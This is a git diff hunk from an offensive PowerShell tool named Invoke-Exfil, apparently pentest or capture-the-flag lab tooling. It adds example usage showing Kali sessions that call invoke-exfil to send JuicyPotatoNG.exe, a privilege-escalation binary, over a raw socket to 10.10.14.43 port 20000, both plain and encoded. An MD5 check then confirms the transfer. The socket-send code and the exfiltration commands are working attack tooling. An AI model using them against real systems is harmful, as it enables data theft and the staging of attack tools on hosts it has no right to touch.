@@ -42,3 +42,21 @@ Function Invoke-Exfil () {
         $Sent = $Sock.Send($Buffer)
         "{0} bytes sent to: {1} " -f $Sent,$IP
 }
+
+
+###################################################################################
+Example Usage
+
+# ┌──(kali㉿kali)-[/home/kali]
+# └─PS> invoke-exfil -ip 10.10.14.43 -port 20000 -path ./JuicyPotatoNG.exe                                                                                                       
+# 153600 characters sent to: 10.10.14.43 
+
+# ┌──(kali㉿kali)-[/home/kali]
+# └─PS> invoke-exfil -ip 10.10.14.43 -port 20000 -path ./JuicyPotatoNG.exe -encoded                                                                                              
+# 204800 characters sent to: 10.10.14.43
+
+# Check: 
+# ┌──(kali㉿kali)-[~]
+# └─$ md5sum file JuicyPotatoNG.exe
+# 1938a3545517650824657fd09ce4ee16  file
+# 1938a3545517650824657fd09ce4ee16  JuicyPotatoNG.exe
